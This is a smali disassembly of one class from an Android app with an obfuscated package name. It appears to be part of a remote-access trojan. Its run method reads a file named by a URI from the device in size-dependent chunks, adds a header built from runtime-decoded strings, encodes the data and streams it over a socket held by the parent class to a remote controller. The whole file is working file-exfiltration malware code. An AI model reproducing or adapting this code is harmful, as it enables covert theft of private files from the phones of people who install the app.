.class Lcmf0/c3b5bm90zq/patch/C11$7;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcmf0/c3b5bm90zq/patch/C11;->d(Ljava/lang/String;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Ljava/lang/String;

.field final synthetic b:Lcmf0/c3b5bm90zq/patch/C11;


# direct methods
.method constructor <init>(Lcmf0/c3b5bm90zq/patch/C11;Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lcmf0/c3b5bm90zq/patch/C11$7;->b:Lcmf0/c3b5bm90zq/patch/C11;

    iput-object p2, p0, Lcmf0/c3b5bm90zq/patch/C11$7;->a:Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 13

    :try_start_0
    iget-object v0, p0, Lcmf0/c3b5bm90zq/patch/C11$7;->b:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-static {v0}, Lcmf0/c3b5bm90zq/patch/C11;->t(Lcmf0/c3b5bm90zq/patch/C11;)Ljava/net/Socket;

    move-result-object v0

    if-eqz v0, :cond_6

    iget-object v0, p0, Lcmf0/c3b5bm90zq/patch/C11$7;->b:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-static {v0}, Lcmf0/c3b5bm90zq/patch/C11;->u(Lcmf0/c3b5bm90zq/patch/C11;)Ljava/io/OutputStream;

    move-result-object v0

    if-eqz v0, :cond_6

    iget-object v0, p0, Lcmf0/c3b5bm90zq/patch/C11$7;->a:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    new-instance v1, Ljava/io/File;

    invoke-virtual {v0}, Landroid/net/Uri;->getPath()Ljava/lang/String;

    move-result-object v0

    invoke-direct {v1, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v0

    if-eqz v0, :cond_6

    invoke-virtual {v1}, Ljava/io/File;->length()J

    move-result-wide v2

    new-instance v0, Ljava/io/FileInputStream;

    invoke-direct {v0, v1}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    new-instance v1, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v1}, Ljava/io/ByteArrayOutputStream;-><init>()V

    long-to-int v2, v2

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Integer;->intValue()I

    move-result v3

    const v4, 0xfa000

    if-lt v3, v4, :cond_0

    const v2, 0x19000

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    goto :goto_0

    :cond_0
    invoke-virtual {v2}, Ljava/lang/Integer;->intValue()I

    move-result v3

    const v4, 0x7d000

    if-lt v3, v4, :cond_1

    const v2, 0xc800

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    goto :goto_0

    :cond_1
    invoke-virtual {v2}, Ljava/lang/Integer;->intValue()I

    move-result v3

    const v4, 0x32000

    if-lt v3, v4, :cond_2

    const/16 v2, 0x5000

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    goto :goto_0

    :cond_2
    invoke-virtual {v2}, Ljava/lang/Integer;->intValue()I

    move-result v2

    const/16 v3, 0x400

    if-lt v2, v3, :cond_3

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    goto :goto_0

    :cond_3
    const/16 v2, 0x200

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    :try_start_1
    invoke-virtual {v2}, Ljava/lang/Integer;->intValue()I

    move-result v2

    new-array v2, v2, [B

    new-instance v3, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v3}, Ljava/io/ByteArrayOutputStream;-><init>()V

    new-instance v4, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v4}, Ljava/io/ByteArrayOutputStream;-><init>()V

    :goto_1
    array-length v5, v2

    const/4 v6, 0x0

    invoke-virtual {v0, v2, v6, v5}, Ljava/io/FileInputStream;->read([BII)I

    move-result v5

    const/4 v7, -0x1

    if-eq v5, v7, :cond_5

    invoke-virtual {v1, v2, v6, v5}, Ljava/io/ByteArrayOutputStream;->write([BII)V

    invoke-static {v6}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v7

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    sget-wide v9, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    const-wide/16 v11, 0x48

    invoke-static {v9, v10, v11, v12}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v9, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-wide v9, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    const-wide/16 v11, 0x67

    invoke-static {v9, v10, v11, v12}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v9, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {v5}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v8, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v5, Lcmf0/c3b5bm90zq/patch/C11;->e:Ljava/lang/String;

    invoke-virtual {v8, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/String;->getBytes()[B

    move-result-object v5

    invoke-virtual {v3, v5}, Ljava/io/ByteArrayOutputStream;->write([B)V

    invoke-virtual {v1}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v5

    invoke-virtual {v3, v5}, Ljava/io/ByteArrayOutputStream;->write([B)V

    invoke-virtual {v3}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v5

    invoke-static {v5}, Lcmf0/c3b5bm90zq/patch/a;->a([B)[B

    move-result-object v5

    array-length v8, v5

    invoke-static {v8}, Ljava/lang/Integer;->toString(I)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/String;->getBytes()[B

    move-result-object v8

    invoke-virtual {v4, v8}, Ljava/io/ByteArrayOutputStream;->write([B)V

    invoke-virtual {v7}, Ljava/lang/String;->getBytes()[B

    move-result-object v7

    invoke-virtual {v4, v7}, Ljava/io/ByteArrayOutputStream;->write([B)V

    invoke-virtual {v4, v5}, Ljava/io/ByteArrayOutputStream;->write([B)V

    invoke-virtual {v4}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v5

    invoke-static {}, Lcmf0/c3b5bm90zq/patch/C11;->l()Ljava/lang/Object;

    move-result-object v7

    monitor-enter v7
    :try_end_1
    .catch Ljava/lang/OutOfMemoryError; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :try_start_2
    iget-object v8, p0, Lcmf0/c3b5bm90zq/patch/C11$7;->b:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-static {v8}, Lcmf0/c3b5bm90zq/patch/C11;->u(Lcmf0/c3b5bm90zq/patch/C11;)Ljava/io/OutputStream;

    move-result-object v8

    if-eqz v8, :cond_4

    iget-object v8, p0, Lcmf0/c3b5bm90zq/patch/C11$7;->b:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-static {v8}, Lcmf0/c3b5bm90zq/patch/C11;->t(Lcmf0/c3b5bm90zq/patch/C11;)Ljava/net/Socket;

    move-result-object v8

    array-length v9, v5

    invoke-virtual {v8, v9}, Ljava/net/Socket;->setSendBufferSize(I)V

    iget-object v8, p0, Lcmf0/c3b5bm90zq/patch/C11$7;->b:Lcmf0/c3b5bm90zq/patch/C11;

    iget-object v9, p0, Lcmf0/c3b5bm90zq/patch/C11$7;->b:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-static {v9}, Lcmf0/c3b5bm90zq/patch/C11;->t(Lcmf0/c3b5bm90zq/patch/C11;)Ljava/net/Socket;

    move-result-object v9

    invoke-virtual {v9}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v9

    invoke-static {v8, v9}, Lcmf0/c3b5bm90zq/patch/C11;->a(Lcmf0/c3b5bm90zq/patch/C11;Ljava/io/OutputStream;)Ljava/io/OutputStream;

    iget-object v8, p0, Lcmf0/c3b5bm90zq/patch/C11$7;->b:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-static {v8}, Lcmf0/c3b5bm90zq/patch/C11;->u(Lcmf0/c3b5bm90zq/patch/C11;)Ljava/io/OutputStream;

    move-result-object v8

    array-length v9, v5

    invoke-virtual {v8, v5, v6, v9}, Ljava/io/OutputStream;->write([BII)V

    iget-object v5, p0, Lcmf0/c3b5bm90zq/patch/C11$7;->b:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-static {v5}, Lcmf0/c3b5bm90zq/patch/C11;->u(Lcmf0/c3b5bm90zq/patch/C11;)Ljava/io/OutputStream;

    move-result-object v5

    invoke-virtual {v5}, Ljava/io/OutputStream;->flush()V

    :cond_4
    monitor-exit v7
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    :try_start_3
    invoke-virtual {v1}, Ljava/io/ByteArrayOutputStream;->reset()V

    invoke-virtual {v3}, Ljava/io/ByteArrayOutputStream;->reset()V

    invoke-virtual {v4}, Ljava/io/ByteArrayOutputStream;->reset()V
    :try_end_3
    .catch Ljava/lang/OutOfMemoryError; {:try_start_3 .. :try_end_3} :catch_0
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0

    goto/16 :goto_1

    :catchall_0
    move-exception v0

    :try_start_4
    monitor-exit v7
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    :try_start_5
    throw v0

    :cond_5
    invoke-virtual {v0}, Ljava/io/FileInputStream;->close()V

    invoke-virtual {v1}, Ljava/io/ByteArrayOutputStream;->flush()V

    invoke-virtual {v1}, Ljava/io/ByteArrayOutputStream;->close()V
    :try_end_5
    .catch Ljava/lang/OutOfMemoryError; {:try_start_5 .. :try_end_5} :catch_0
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_0

    :catch_0
    :cond_6
    return-void
.end method
